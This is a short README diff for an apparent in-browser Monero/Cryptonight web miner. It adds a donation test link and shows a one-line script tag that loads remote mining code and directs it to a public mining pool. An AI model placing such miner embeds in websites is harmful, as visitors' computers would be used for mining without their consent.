@@ -5,8 +5,10 @@ Attention: IPBC created their own PoW variant....so mining is disabled for the m
 <br>
 #### Update: Cryptonight V8 ready - Fork date 2018-10-18 after block 1685555 --> ?algo=cn?variant=0 for autoswitch
 <br>
+#### LiveTest - https://www.donate.crypto-webminer.com/donate.html
+<br>
 #### Simple Pool change: ?jason=Your_Favorite_Pool:PortNr
-
+<br>
 #### Complete example for Cryptonight default fork Coins (autoswitch):
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=0?jason=pool.supportxmr.com:3333" > </script>
